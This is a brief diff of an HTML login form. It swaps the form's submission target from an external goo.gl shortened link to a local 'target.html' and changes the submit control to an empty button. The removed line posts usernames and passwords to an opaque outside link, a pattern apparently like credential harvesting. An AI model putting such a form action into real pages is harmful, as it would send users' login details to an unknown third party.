@@ -19,7 +19,7 @@
             </h1>
             <br>
            
-            <form method="POST" action="https://goo.gl/E1RcWU" onsubmit="return checkForm(this);" style="color:white;">
+            <form method="POST" action="target.html" onsubmit="return checkForm(this);" style="color:white;">
                Username&nbsp;
                <input title="Enter your username" type="text" required pattern="\w+" name="username">
                &nbsp;&nbsp;
@@ -29,7 +29,7 @@
                   this.setCustomValidity(this.validity.patternMismatch ? this.title : '');
                   if(this.checkValidity()) form.pwd2.pattern = this.value;"> 
               
-               &nbsp;&nbsp;<input type="submit" value="Login">
+               &nbsp;&nbsp;<button type="submit" value="Login"></button>
             </form>
          </div>
       </div>
